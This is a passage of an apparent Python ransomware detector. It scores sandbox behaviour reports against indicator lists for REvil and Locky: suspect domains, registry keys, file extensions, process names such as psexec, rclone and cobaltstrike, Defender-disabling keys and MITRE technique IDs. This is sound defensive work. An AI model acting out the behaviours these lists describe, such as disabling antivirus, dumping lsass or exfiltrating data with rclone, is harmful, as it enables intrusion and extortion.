'myteamgenius.com', 'mytechnoway.com', 'myzk.site', 'n1-headache.com', 'nachhilfe-unterricht.com', 'nacktfalter.de', 'nakupunafoundation.org', 'nancy-informatique.fr', 'nandistribution.nl', 'narcert.com', 
                    'naswrrg.org', 'nataschawessels.com', 'nativeformulas.com', 'naturalrapids.com', 'naturstein-hotte.de', 'ncid.bc.ca', 'ncs-graphic-studio.com', 'ncuccr.org', 'nestor-swiss.ch', 'neuschelectrical.co.za', 'new.devon.gov.uk', 'newstap.com.ng', 'newyou.at', 'nhadatcanho247.com', 'nicoleaeschbachorg.wordpress.com', 'nijaplay.com', 'nmiec.com', 'no-plans.com', 'noesis.tech', 'noixdecocom.fr', 'nokesvilledentistry.com', 'norovirus-ratgeber.de', 'norpol-yachting.com', 'noskierrenteria.com', 'nosuchthingasgovernment.com', 'notmissingout.com', 'notsilentmd.org', 'nsec.se', 'nurturingwisdom.com', 'nuzech.com', 'nvwoodwerks.com', 'oceanastudios.com', 'oemands.dk', 'officehymy.com', 'offroadbeasts.com', 'ogdenvision.com', 'ohidesign.com', 'oldschoolfun.net', 'olejack.ru', 'oncarrot.com', 'oneheartwarriors.at', 'oneplusresource.org', 'onlybacklink.com', 'onlyresultsmarketing.com', 'ontrailsandboulevards.com', 'opatrovanie-ako.sk', 'operaslovakia.sk', 'ora-it.de', 'oslomf.no', 'osterberg.fi', 'ostheimer.at', 'otsu-bon.com', 'otto-bollmann.de', 'ouryoungminds.wordpress.com', 'outcomeisincome.com', 'panelsandwichmadrid.es', 'paradicepacks.com', 'parebrise-tla.fr', 'parkcf.nl', 'parking.netgateway.eu', 'parks-nuernberg.de', 'parkstreetauto.net', 'partnertaxi.sk', 'pasivect.co.uk', 'pasvenska.se', 'patrickfoundation.net', 'paulisdogshop.de', 'pawsuppetlovers.com', 'pay4essays.net', 'paymybill.guru', 'pcp-nc.com', 'pcprofessor.com', 'pelorus.group', 'penco.ie', 'people-biz.com', 'perbudget.com', 'personalenhancementcenter.com', 'peterstrobos.com', 'petnest.ir', 'pferdebiester.de', 'phantastyk.com', 'philippedebroca.com', 'physiofischer.de', 'piajeppesen.dk', 'pickanose.com', 'pier40forall.org', 'pierrehale.com', 'pinkexcel.com', 'pivoineetc.fr', 'pixelarttees.com', 'planchaavapor.net', 'plantag.de', 'plastidip.com.ar', 'platformier.com', 'plotlinecreative.com', 'plv.media', 'pmc-services.de', 'pmcimpact.com', 'pocket-opera.de', 'podsosnami.ru', 'pogypneu.sk', 'pointos.com', 'polychromelabs.com', 'polymedia.dk', 'polzine.net', 'pomodori-pizzeria.de', 'porno-gringo.com', 'portoesdofarrobo.com', 'poultrypartners.nl', 'praxis-foerderdiagnostik.de', 'praxis-management-plus.de', 'precisionbevel.com', 'presseclub-magdeburg.de', 'pridoxmaterieel.nl', 'prochain-voyage.net', 'profectis.de', 'projetlyonturin.fr', 'promalaga.es', 'promesapuertorico.com', 'proudground.org', 'psa-sec.de', 'psc.de', 'psnacademy.in', 'pt-arnold.de', 'pubweb.carnet.hr', 'puertamatic.es', 'punchbaby.com', 'purposeadvisorsolutions.com', 'pv-design.de', 'qlog.de', 'qualitaetstag.de', 'qualitus.com', 'quemargrasa.net', 'quickyfunds.com', 'quizzingbee.com', 'ra-staudte.de', 'radaradvies.nl', 'rafaut.com', 'ralister.co.uk', 'raschlosser.de', 'ravensnesthomegoods.com', 'readberserk.com', 'real-estate-experts.com', 'rebeccarisher.com', 'reddysbakery.com', 'refluxreducer.com', 'rehabilitationcentersinhouston.net', 'remcakram.com', 'renergysolution.com', 'rerekatu.com', 'resortmtn.com', 'restaurantesszimmer.de', 'retroearthstudio.com', 'revezlimage.com', 'rhinosfootballacademy.com', 'richard-felix.co.uk', 'rieed.de', 'rimborsobancario.net', 'rksbusiness.com', 'roadwarrior.app', 'rocketccw.com', 'rollingrockcolumbia.com', 'romeguidedvisit.com', 'rosavalamedahr.com', 'rostoncastings.co.uk', 'rota-installations.co.uk', 'roygolden.com', 'rozemondcoaching.nl', 'rumahminangberdaya.com', 'run4study.com', 'ruralarcoiris.com', 'rushhourappliances.com', 'saarland-thermen-resort.com', 'sabel-bf.com', 'sachnendoc.com', 'sagadc.com', 'sahalstore.com', 'sairaku.net', 'saka.gr', 'samnewbyjax.com', 'sanaia.com', 'sandd.nl', 'sanyue119.com', 'sarbatkhalsafoundation.org', 'satyayoga.de', 'sauschneider.info', 'saxtec.com', 'scenepublique.net', 'schlafsack-test.net', 'schmalhorst.de', 'schmalhorst.de', 'schoellhammer.com', 'schoolofpassivewealth.com', 
                    'schraven.de', 'schutting-info.nl', 'seagatesthreecharters.com', 'securityfmm.com', 'seevilla-dr-sturm.at', 'seitzdruck.com', 'selfoutlet.com', 'seminoc.com', 'senson.fi', 'seproc.hn', 'serce.info.pl', 'servicegsm.net', 'sevenadvertising.com', 'sexandfessenjoon.wordpress.com', 'shadebarandgrillorlando.com', 'shhealthlaw.com', 'shiftinspiration.com', 'shiresresidential.com', 'shonacox.com', 'shsthepapercut.com', 'siliconbeach-realestate.com', 'siluet-decor.ru', 'simoneblum.de', 'simpkinsedwards.co.uk', 'simpliza.com', 'simplyblessedbykeepingitreal.com', 'simulatebrain.com', 'sinal.org', 'sipstroysochi.ru', 'skanah.com', 'skiltogprint.no', 'sla-paris.com', 'slashdb.com', 'slimani.net', 'slimidealherbal.com', 'sloverse.com', 'slupetzky.at', 'slwgs.org', 'smale-opticiens.nl', 'smalltownideamill.wordpress.com', 'smart-light.co.uk', 'smartypractice.com', 'smejump.co.th', 'smessier.com', 'smhydro.com.pl', 'smithmediastrategies.com', 'smogathon.com', 'smokeysstoves.com', 'sobreholanda.com', 'socialonemedia.com', 'socstrp.org', 'sofavietxinh.com', 'softsproductkey.com', 'sojamindbody.com', 'solerluethi-allart.ch', 'solhaug.tk', 'solinegraphic.com', 'songunceliptv.com', 'sotsioloogia.ee', 'southeasternacademyofprosthodontics.org', 'space.ua', 'spacecitysisters.org', 'spargel-kochen.de', 'spd-ehningen.de', 'spectrmash.ru', 'spinheal.ru', 'sporthamper.com', 'sportiomsportfondsen.nl', 'sportsmassoren.com', 'sportverein-tambach.de', 'spsshomeworkhelp.com', 'spylista.com', 'stacyloeb.com', 'stallbyggen.se', 'stampagrafica.es', 'starsarecircular.org', 'steampluscarpetandfloors.com', 'stefanpasch.me', 'stemenstilte.nl', 'stemplusacademy.com', 'sterlingessay.com', 'stingraybeach.com', 'stoeberstuuv.de', 'stoeferlehalle.de', 'stoneys.ch', 'stopilhan.com', 'stormwall.se', 'strandcampingdoonbeg.com', 'strategicstatements.com', 'streamerzradio1.site', 'stupbratt.no', 'summitmarketingstrategies.com', 'suncrestcabinets.ca', 'supportsumba.nl', 'surespark.org.uk', 'sw1m.ru', 'sweering.fr', 'symphonyenvironmental.com', 'syndikat-asphaltfieber.de', 'synlab.lt', 'systemate.dk', 'takeflat.com', 'talentwunder.com', 'tampaallen.com', 'tanciu.com', 'tandartspraktijkhartjegroningen.nl', 'tandartspraktijkheesch.nl', 'tanzprojekt.com', 
                    'tanzschule-kieber.de', 'tarotdeseidel.com', 'tastewilliamsburg.com', 'team-montage.dk', 'tecnojobsnet.com', 'teczowadolina.bytom.pl', 'teknoz.net', 'tenacitytenfold.com', 'tennisclubetten.nl', 'teresianmedia.org', 'testcoreprohealthuk.com', 'testzandbakmetmening.online', 'tetinfo.in', 'thailandholic.com', 'thaysa.com', 'the-domain-trader.com', 'the-virtualizer.com', 'theadventureedge.com', 'theapifactory.com', 'theclubms.com', 'thedad.com', 'thedresserie.com', 'theduke.de', 
                    'thee.network', 'thefixhut.com', 'theletter.company', 'themadbotter.com', 'thenewrejuveme.com', 'theshungiteexperience.com.au', 'thewellnessmimi.com', 'thomas-hospital.de', 'thomasvicino.com', 'tigsltd.com', 'tinkoff-mobayl.ru', 'tinyagency.com', 'tips.technology', 'todocaracoles.com', 'tomaso.gr', 'tomoiyuma.com', 'tonelektro.nl', 'tongdaifpthaiphong.net', 'tophumanservicescourses.com', 'toponlinecasinosuk.co.uk', 'toreria.es', 'torgbodenbollnas.se', 'trackyourconstruction.com', 'tradiematepro.com.au', 'transliminaltribe.wordpress.com', 'transportesycementoshidalgo.es', 'trapiantofue.it', 'travelffeine.com', 'triactis.com', 'triggi.de', 'troegs.com', 'truenyc.co', 'trulynolen.co.uk', 'trystana.com', 'tsklogistik.eu', 'tstaffing.nl', 'tulsawaterheaterinstallation.com', 'turkcaparbariatrics.com', 'tuuliautio.fi', 'tux-espacios.com', 'twohourswithlena.wordpress.com', 'uimaan.fi', 'ulyssemarketing.com', 'unetica.fr', 'ungsvenskarna.se', 'unim.su', 'upmrkt.co', 'upplandsspar.se', 'uranus.nl', 'urclan.net', 'urist-bogatyr.ru', 'urmasiimariiuniri.ro', 'ussmontanacommittee.us', 'vancouver-print.ca', 'vannesteconstruct.be', 'vanswigchemdesign.com', 'vdberg-autoimport.nl', 'ventti.com.ar', 'verbisonline.com', 'verifort-capital.de', 'vermoote.de', 'verytycs.com', 'vesinhnha.com.vn', 'vetapharma.fr', 'veybachcenter.de', 'vibehouse.rw', 'vibethink.net', 'vickiegrayimages.com', 'victoriousfestival.co.uk', 'videomarketing.pro', 'vietlawconsultancy.com', 'vihannesporssi.fi', 'villa-marrakesch.de', 'visiativ-industry.fr', 'vitalyscenter.es', 'vitavia.lt', 'vloeren-nu.nl', 'vorotauu.ru', 'vox-surveys.com', 'vyhino-zhulebino-24.ru', 'wacochamber.com', 'waermetauscher-berechnen.de', 'walkingdeadnj.com', 'walter-lemm.de', 'wari.com.pe', 'wasmachtmeinfonds.at', 'waveneyrivercentre.co.uk', 'waynela.com', 'waywithwords.net', 'web.ion.ag', 'webcodingstudio.com', 'webmaster-peloton.com', 'wellplast.se', 'werkkring.nl', 'westdeptfordbuyrite.com', 'whittier5k.com', 'whyinterestingly.ru', 'wien-mitte.co.at', 'winrace.no', 'withahmed.com', 'wmiadmin.com', 'wolf-glas-und-kunst.de', 'woodleyacademy.org', 'woodworkersolution.com', 'work2live.de', 'worldhealthbasicinfo.com', 'wraithco.com', 'wsoil.com.sg', 'wurmpower.at', 'www1.proresult.no', 'wychowanieprzedszkolne.pl', 'x-ray.ca', 'xlarge.at', 'xltyu.com', 'xn--fn-kka.no', 'xn--fnsterputssollentuna-39b.se', 'xn--logopdie-leverkusen-kwb.de', 'xn--rumung-bua.online', 'xn--singlebrsen-vergleich-nec.com', 'xn--thucmctc-13a1357egba.com', 'xn--vrftet-pua.biz', 'xoabigail.com', 'xtptrack.com', 'y-archive.com', 'yamalevents.com', 'yassir.pro', 'ymca-cw.org.uk', 'you-bysia.com.au', 'yourobgyn.net', 'yousay.site', 'zenderthelender.com', 'zervicethai.co.th', 'zewatchers.com', 'zflas.com', 'ziegler-praezisionsteile.de', 'zieglerbrothers.de', 'zimmerei-deboer.de', 'zimmerei-fl.de', 'zonamovie21.net', 'zso-mannheim.de', 'zweerscreatives.nl', 'zzyjtsgls.com']
    NT_DETECTED = ["Your files are encrypted"]
    # Registry Key of file :
    try :
        for i in dictionary["data"]["registry_keys_opened"] :
            for j in revil_REGISTRY_KEYS:
                if j in i:
                    if j in "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\":
                        if ".exe" in j:
                            total += 1
                        else:
                            total += 0
                    else:
                        total += 1
        #print("Total registry_keys_opened est : "+str(len(dictionary["data"]["registry_keys_opened"]))+"/"+str(total))
    except KeyError:
        total += 0
    
    # processes terminated
    try :
        
        for i in dictionary["data"]["processes_terminated"] :
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i or "${SamplePath}" in j :
                        if ".exe" in i:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
        #print("Total processes_terminated est : "+str(len(dictionary["data"]["processes_terminated"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files deleted
    try :
        
        for i in dictionary["data"]["files_deleted"]:
            for j in revil_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
        #print("Total files_deleted est : "+str(len(dictionary["data"]["files_deleted"]))+"/"+str(total))
    except KeyError:
        total += 0
    # processes_tree
    try :
        
        for i in dictionary["data"]["processes_tree"]:
            for j in revil_EXTENSIONS:
                if j.lower() in i["name"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i["name"]:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["name"]:
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_tree est : "+str(len(dictionary["data"]["processes_tree"]))+"/"+str(total))
    except KeyError:
        total += 0

    # signature matches
    try :
        
        for i in dictionary["data"]["signature_matches"]:
            for j in i:
                if j == "match_data":
                    for k in i[j]:
                        for l in revil_EXTENSIONS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in PATH_RANSOMWARE:
                            if l.lower() in k.lower():
                                total += 1
                        for l in SUSPICIOUS_PROCESS_NAMES:
                            if l.lower() in k.lower():
                                total += 1
                        for l in revil_REGISTRY_KEYS:
                            if l in k:
                                total += 1
                        for l in NT_DETECTED:
                            if l in k:
                                total += 1
                        for l in URLS_SUSPECTS:
                            if l in k:
                                total += 1
        #print("Total signature matches est : "+str(len(dictionary["data"]["signature_matches"]))+"/"+str(total))
    except KeyError :
        total += 0
    # modules_loaded
    try :
        for i in dictionary["data"]["modules_loaded"]:
            for j in revil_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
        #print("Total modules_loaded est : "+str(len(dictionary["data"]["modules_loaded"]))+"/"+str(total))
    except KeyError :
        total += 0
    #dns_lookups
    try :
        for i in dictionary["data"]["dns_lookups"]:
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i["resolved_ips"]:
                    total += 1
        #print("Total dns_lookups est : "+str(len(dictionary["data"]["dns_lookups"]))+"/"+str(total))
    except KeyError :
        total += 0
    # memory_pattern_domains
    try :
        
        for i in dictionary["data"]["memory_pattern_domains"]:
            for j in URLS_SUSPECTS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # memory_pattern_ips
    try :
        for i in dictionary["data"]["memory_pattern_ips"]:
            for j in SUSPICIOUS_NETWORK_IPS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # mutexes created
    mutex = [r"Global\MsWinZonesCacheCounterMutexA",r"Global\UACMutex",r"Global\WindowsUpdateLockMutex",r"Global\RpcEptMapperMutex",
            r"Global\UuidMutex",r"Global\wininetCacheMutex","Global\\"]
    try :
        for i in dictionary["data"]["mutexes_created"]:
            for j in mutex:
                if j in i:
                    total += 1
        for i in dictionary["data"]["mutexes_opened"]:
            for j in mutex:
                if j in i:
                    total += 1
        #print("Total mutexes created and opened est : "+str(len(dictionary["data"]["mutexes_created"]))+"/"+str(total))
    except KeyError :
        total += 0

    # text_decoded
    try :
        
        for i in dictionary["data"]["text_decoded"]:
            if "revil" in i:
                total += 1
            for j in NT_DETECTED:
                if j in i:
                    total += 1
    except KeyError :
        total += 0

    # files_opened
    try :
        
        for i in dictionary["data"]["files_opened"]:
            for j in revil_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in TERMES:
                if j.lower() in i.lower():
                    total += 1
    except KeyError:
        total += 0

    #registry_keys_set
    try :
        
        for i in dictionary["data"]["registry_keys_set"]:
            for j in i:
                if j in "key":
                    for k in revil_REGISTRY_KEYS:
                        if k in i[j]:
                            total +=1
        
        #print("Total registry_keys_set est : "+str(len(dictionary["data"]["registry_keys_set"]))+"/"+str(total))
    except KeyError :
        total += 0
        
    # registry_keys_deleted
    try :
        
        for i in dictionary["data"]["registry_keys_deleted"]:
            for j in revil_REGISTRY_KEYS:
                if j in i:
                    total +=1
        
        #print("Total registry_keys_deleted est : "+str(len(dictionary["data"]["registry_keys_deleted"]))+"/"+str(total))
    except KeyError :
        total += 0

    # processes_created
    try :
        
        for i in dictionary["data"]["processes_created"]:
            for j in revil_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_created est : "+str(len(dictionary["data"]["processes_created"]))+"/"+str(total))
    except KeyError:
        total += 0

    # attack_techniques
    try :
        mitre_techniques = ["T1566","T1190","T1189","T1195","T1078","T1204","T1129","T1059","T1106","T1547","T1574","T1134","T1068","T1574","T1027",
                            "T1562","T1574","T1083","T1018","T1057","T1082","T1012","T1063","T1003","T1552","T1570","T1560","T1005","T1071","T1567",
                            "T1048","T1486","T1489","T1490","T1529","T1491","T1518"]
        
        for i in dictionary["data"]["attack_techniques"]:
            for j in mitre_techniques:
                if j in i:
                    total += 1
        #print("Total total est : "+str(len(dictionary["data"]["mitre_attack_techniques"]))+"/"+str(total))
    except KeyError:
        total += 0

    # ip_traffic
    
    try :
        for i in dictionary["data"]["ip_traffic"]:
            for j in i:
                if j in "destination_ip":
                    for k in SUSPICIOUS_NETWORK_IPS:
                        if k in i[j]:
                            total += 1
                if j in "destination_port":
                    for k in SUSPICIOUS_NETWORK_PORT:
                        if k == i[j]:
                            total += 1
        #print("Total ip_traffic est : "+str(5*len(dictionary["data"]["ip_traffic"]))+"/"+str(total))
    except KeyError:
        total += 0
    
    # files_copied
    
    try :
        for i in dictionary["data"]["files_copied"]:
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in TERMES:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in revil_EXTENSIONS:
                if j in i["destination"]:
                    total += 1
        #print("Total files_copied est : "+str(4 * len(dictionary["data"]["files_copied"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_written
    try :
        
        for i in dictionary["data"]["files_written"]:
            for j in revil_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in TERMES:
                if j.lower() in i.lower():
                    total += 1
            
        #print("Total files_written est : "+str(len(dictionary["data"]["files_written"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_dropped
    try :
        
        for i in dictionary["data"]["files_dropped"]:
            for j in i:
                if "path" in j:
                    for k in revil_EXTENSIONS:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in SUSPICIOUS_PROCESS_NAMES:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in PATH_RANSOMWARE:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in TERMES:
                        if k in i[j]:
                            total += 1
            
        #print("Total files_dropped est : "+str(len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    # command_executions
    try :
        
        for i in dictionary["data"]["command_executions"]:
            for j in power_shell_cmd :
                if j in i:
                    total += 1
        #print("Total command_executions est : "+str(2*len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    
    # memory_pattern_urls
    try :
        
        for i in dictionary["data"]["memory_pattern_urls"]:
            for j in URLS_SUSPECTS:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i:
                    total += 1
            
        #print("Total memory_pattern_urls est : "+str(len(dictionary["data"]["memory_pattern_urls"]))+"/"+str(total))
    except KeyError:
        total += 0
    # http_conversations
    try :
        for i in dictionary["data"]["http_conversations"]:
            for j in URLS_SUSPECTS:
                if j in i["url"]:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i["url"]:
                    total += 1
            
        #print("Total http_conversations est : "+str(len(dictionary["data"]["http_conversations"]))+"/"+str(total))
    except KeyError:
        total += 0
    # Calculate the probs
    #print("[REVIL//SODINOKIBI] ~ La somme de tout est : "+str(total))
    return total

def check_for_locky_behaviors(json_file):
    # Somme total 
    total = 0

    # Read the file json
    with open(json_file) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)

    # List of common file extensions encrypted by locky
    locky_EXTENSIONS = [".locky",".zepto",".odin",".aesir",".thor",".zzzzz",".shit",".osiris",".diablo6",".asasin",".loptr",".ykcol"]
    
    # List of common registry keys modified by locky
    locky_REGISTRY_KEYS = [
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network",
        "HKLM\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\TRACING\\0036407552_RASAPI32",
        "HKLM\\Software\\Microsoft\\Tracing\\ESET32_RASAPI32",
        "HKLM\\Software\\Microsoft\\Tracing\\ESET32_RASMANCS",
        "\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Tracing\\RASAPI32",
        "\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Tracing\\RASMANCS",
        "HKEY_CURRENT_USER\\Software\\Locky",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Tracing\\svchost_RASAPI32",
        r"HKEY_CURRENT_USER\Software[random_name]",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\WallpaperStyle",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\UserChoice\Progid",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\OpenWithList",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\OpenWithProgids",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
        r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableRealtimeMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableBehaviorMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableIntrusionPreventionSystem",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Rpc\\Extensions",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Rpc",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Policies\\Microsoft\\Windows NT\\Rpc",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces",
        "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        "HKLM\\Software\\Microsoft\\Cryptography",
        "HKLM\\Software\\Policies\\Microsoft\\Cryptography",
        "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        "HKLM\\Software\\Microsoft\\Cryptography\\Offload",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Winsock\\Setup Migration\\Providers\\Tcpip6",
        r"\REGISTRY\MACHINE\SOFTWARE\Wow6432Node\LFF9miD",
        "<HKLM>\\SOFTWARE\\Wow6432Node\\LFF9miD",
        "HKLM\\Software\\SBB CFF FFS AG\\Ransimware\\1.0.0.0",
        "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\SHELL FOLDERS",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Locky",
        r"HKEY_CURRENT_USER\Software\Locky\code",
        "\\REGISTRY\\MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Rpc",
        "\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe",
        "\\REGISTRY\\MACHINE\\Software\\Policies\\Microsoft\\Cryptography",
        "HKEY_CURRENT_USER\\Software\\Locky\\pubkey",
        r"HKEY_CURRENT_USER\Software\Locky\enc",
        r"HKEY_CURRENT_USER\Software\Locky\completedtime",
        r"HKEY_CURRENT_USER\Software\Locky\encfiles",
        r"HKEY_CURRENT_USER\Software\Locky\users",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Locky",
        r"HKEY_CURRENT_USER\Software\Locky\paytext",
        r"HKEY_CURRENT_USER\Software\Locky\completed",
        r"HKEY_CURRENT_USER\Software\Locky\id",
        r"HKEY_CURRENT_USER\Software\Locky\desktopwallpaper",
        r"HKEY_CURRENT_USER\Software\Locky\email",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\CodePage",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup",
        r"HKEY_CURRENT_USER\Software\Locky\help_instructions"
    ]
    
    TERMES = ["top secret","Important confidential","Important equipment","Interior Pictures","Legal Affairs"]

    # Check for suspicious process names associated with locky
    SUSPICIOUS_PROCESS_NAMES = ["user32.dll","HOW-TO-DECRYPT.txt","dontsleep.exe","msmpeng.exe","netscan.exe","m.exe","Taschost.exe","u0441host.exe","int32.dll","psexec.exe","Invoice_29557473.exe","windef.exe","win163.65.tmp",
                                "winupd.tmp","officeupd.tmp","mswordupd.tmp","dospizdos.tmp","wordupd.tmp","wordupd_3.0.1.tmp","srv.txt",
                                "wm_start.bat","copy_files_srv.bat","rclone.exe","README.txt","ShellExperienceHost.exe","net.exe",
                                "locky_readme.txt", "taskdl.exe", "cobaltstrike.exe", "powershell.exe","cmd.exe", "rundll32.exe", "wscript.exe", 
                                "lsass.exe", "svchost.exe", "explorer.exe", "spoolsv.exe","crypt32.dll","bcrypt.dll","ncrypt.dll","CRYPTBASE.dll",
                                "wuapihost.exe","WMIC.exe","conhost.exe","CRYPTSP.dll","rpcrt4.dll","locky.exe","sc.exe","svc.exe","winlogon.exe",
                                "wermgr.exe","rdpclip.exe","wininit.exe","regsvr32.exe","wininet.dll","userinit.dll","wuauclt.exe",
                                "winrm.vbs","logonui.exe","backup.exe","msvcrt.dll","RpcRtRemote.dll","rasapi32.dll","rasman.dll",
